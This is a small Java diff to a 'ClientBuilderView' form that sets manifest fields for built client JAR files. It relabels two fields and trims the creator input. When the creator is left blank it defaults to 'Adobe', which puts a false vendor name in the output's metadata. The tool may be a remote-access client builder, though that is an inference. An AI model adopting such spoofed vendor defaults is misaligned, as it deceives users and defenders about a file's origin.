@@ -45,11 +45,11 @@ class ClientBuilderView {
         hbox.setId("clientBuilder");
         hbox.setPadding(new Insets(75, 20, 20, 20));
         // Created-By
-        Label createdByLabel = (Label) Styler.styleAdd(new Label("Created By: "), "label-bright");
+        Label createdByLabel = (Label) Styler.styleAdd(new Label("Implementation-Title: "), "label-bright");
         jarCreatedBy = new TextField();
 
         // Version
-        Label jarVersionLabel = (Label) Styler.styleAdd(new Label("Version: "), "label-bright");
+        Label jarVersionLabel = (Label) Styler.styleAdd(new Label("Implementation-Version: "), "label-bright");
         jarVersion = new TextField();
 
         TitledPane jarSettings = (TitledPane) Styler.styleAdd(new TitledPane(), "label-bright");
@@ -162,7 +162,7 @@ class ClientBuilderView {
                     Logger.log(Level.ERROR, e.toString());
                 }
             }
-            if ((!jarCreatedBy.getText().equals(""))){
+            if ((!jarCreatedBy.getText().trim().equals(""))){
                 ClientBuilder.jarCreatedBy = jarCreatedBy.getText();
             } else {
                 ClientBuilder.jarCreatedBy = "Adobe";
